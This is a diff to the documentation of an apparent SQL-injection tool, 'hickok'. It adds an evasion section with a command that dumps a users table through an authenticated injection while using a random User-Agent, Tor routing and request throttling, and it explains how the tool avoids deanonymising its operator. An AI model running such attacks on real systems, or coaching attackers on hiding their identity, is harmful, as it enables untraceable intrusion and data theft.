@@ -75,6 +75,24 @@ hickok(sql)> dump users
 Boolean-blind is slow by nature (each character is binary-searched over many
 requests) — it prints the request count as it goes.
 
+**Evasion / OPSEC:**
+
+```bash
+hickok sql -u '...' -p id \
+  --random-agent \                 # a random real browser User-Agent
+  --tor \                          # route via Tor, verified (see below)
+  --cookie 'sid=…' -H 'X-Api: …' \ # authenticated injection
+  --delay 0.3 -v 2 \               # throttle; print every payload
+  --dump users                     # non-interactive: run one action and exit
+```
+
+`--tor` is **fail-closed and leak-aware**: it uses `socks5h` so the target
+hostname is resolved by Tor (no DNS leak to your resolver), and it **verifies the
+exit is a Tor node before sending any attack traffic** — if it can't confirm,
+hickok aborts rather than deanonymising you. SOCKS needs PySocks
+(`pip install hickok[tor]`); for a zero-dependency route, run the whole process
+with `torsocks hickok sql …`. `--proxy http://host:port` works with no extras.
+
 ## The bridge — `hickok hand`
 
 `hickok hand` picks up wraith's latest run on its own — wraith writes to a fixed
